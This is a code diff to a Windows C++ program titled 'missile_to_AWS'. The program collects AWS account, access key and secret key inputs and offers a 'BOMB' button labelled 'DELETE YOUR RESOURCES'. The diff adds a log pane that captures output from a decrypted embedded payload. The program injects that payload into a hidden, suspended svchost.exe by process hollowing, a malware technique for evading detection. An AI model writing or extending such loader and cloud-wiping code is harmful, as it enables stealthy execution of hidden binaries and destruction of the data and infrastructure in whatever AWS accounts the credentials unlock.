@@ -21,6 +21,7 @@ typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
 #define ID_EDIT_ACCOUNT 2001
 #define ID_EDIT_ACCESS_KEY 2002
 #define ID_EDIT_SECRET_KEY 2003
+#define ID_EDIT_LOGS 2004
 
 // Region Checkbox IDs
 #define ID_CHK_REGION_START 3000
@@ -39,7 +40,7 @@ std::vector<Region> g_regions = {
     {L"sa-east-1", false}, {L"global", true}
 };
 
-HWND g_hAccount, g_hAccessKey, g_hSecretKey;
+HWND g_hAccount, g_hAccessKey, g_hSecretKey, g_hLogs;
 
 std::vector<unsigned char> LoadAndDecryptBinary() {
     std::vector<unsigned char> buffer;
@@ -60,21 +61,64 @@ std::vector<unsigned char> LoadAndDecryptBinary() {
     return buffer;
 }
 
+void AppendLog(const std::wstring& text) {
+    int len = GetWindowTextLength(g_hLogs);
+    SendMessage(g_hLogs, EM_SETSEL, (WPARAM)len, (LPARAM)len);
+    SendMessage(g_hLogs, EM_REPLACESEL, 0, (LPARAM)text.c_str());
+}
+
+DWORD WINAPI ReadPipeThread(LPVOID lpParam) {
+    HANDLE hPipe = (HANDLE)lpParam;
+    char buffer[1024];
+    DWORD bytesRead;
+    while (ReadFile(hPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
+        buffer[bytesRead] = '\0';
+        int wlen = MultiByteToWideChar(CP_UTF8, 0, buffer, bytesRead, NULL, 0);
+        std::wstring wmsg(wlen, 0);
+        MultiByteToWideChar(CP_UTF8, 0, buffer, bytesRead, &wmsg[0], wlen);
+        
+        // Convert \n to \r\n for the edit control
+        std::wstring finalMsg;
+        for(auto c : wmsg) {
+            if(c == L'\n') finalMsg += L"\r\n";
+            else finalMsg += c;
+        }
+        
+        // This is safe because SendMessage is thread-safe for many things, but better to use a dedicated buffer
+        AppendLog(finalMsg);
+    }
+    CloseHandle(hPipe);
+    return 0;
+}
+
 bool ProcessHollow(const std::vector<unsigned char>& payload, const std::wstring& args) {
     if (payload.empty()) return false;
 
     IMAGE_DOS_HEADER* pDos = (IMAGE_DOS_HEADER*)payload.data();
     IMAGE_NT_HEADERS64* pNt = (IMAGE_NT_HEADERS64*)(payload.data() + pDos->e_lfanew);
 
+    HANDLE hReadPipe, hWritePipe;
+    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
+    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) return false;
+    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);
+
     STARTUPINFO si = { sizeof(si) };
+    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+    si.hStdOutput = hWritePipe;
+    si.hStdError = hWritePipe;
+    si.wShowWindow = SW_HIDE;
+
     PROCESS_INFORMATION pi;
-    std::wstring cmd = L"C:\\Windows\\System32\\cmd.exe /c \"echo Processing... && pause\""; // Placeholder host
-    // Actually, we can use a simpler host process.
     std::wstring host = L"C:\\Windows\\System32\\svchost.exe";
 
-    if (!CreateProcess(host.c_str(), NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+    if (!CreateProcess(host.c_str(), NULL, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+        CloseHandle(hReadPipe);
+        CloseHandle(hWritePipe);
         return false;
     }
+
+    CloseHandle(hWritePipe); // Close our end of write pipe
+    CreateThread(NULL, 0, ReadPipeThread, hReadPipe, 0, NULL);
 
     CONTEXT ctx;
     ctx.ContextFlags = CONTEXT_FULL;
@@ -190,6 +234,9 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) 
 
         CreateWindow(L"STATIC", L"● BOMB", WS_VISIBLE | WS_CHILD, 20, 590, 200, 25, hwnd, NULL, NULL, NULL);
         CreateWindow(L"BUTTON", L"DELETE YOUR RESOURCES", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON, 20, 620, 250, 35, hwnd, (HMENU)ID_BTN_NUKE, NULL, NULL);
+        
+        CreateWindow(L"STATIC", L"📜 LOGS", WS_VISIBLE | WS_CHILD, 20, 670, 200, 25, hwnd, NULL, NULL, NULL);
+        g_hLogs = CreateWindow(L"EDIT", L"", WS_VISIBLE | WS_CHILD | WS_BORDER | ES_MULTILINE | ES_AUTOVSCROLL | ES_READONLY | WS_VSCROLL, 20, 700, 740, 150, hwnd, (HMENU)ID_EDIT_LOGS, NULL, NULL);
 
         EnumChildWindows(hwnd, [](HWND child, LPARAM font) -> BOOL {
             SendMessage(child, WM_SETFONT, font, TRUE);
@@ -223,7 +270,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
     RegisterClassEx(&wc);
 
-    HWND hwnd = CreateWindowEx(0, CLASS_NAME, L"missile_to_AWS", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 800, 800, NULL, NULL, hInstance, NULL);
+    HWND hwnd = CreateWindowEx(0, CLASS_NAME, L"missile_to_AWS", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 800, 900, NULL, NULL, hInstance, NULL);
     if (hwnd == NULL) return 0;
 
     ShowWindow(hwnd, nShowCmd);
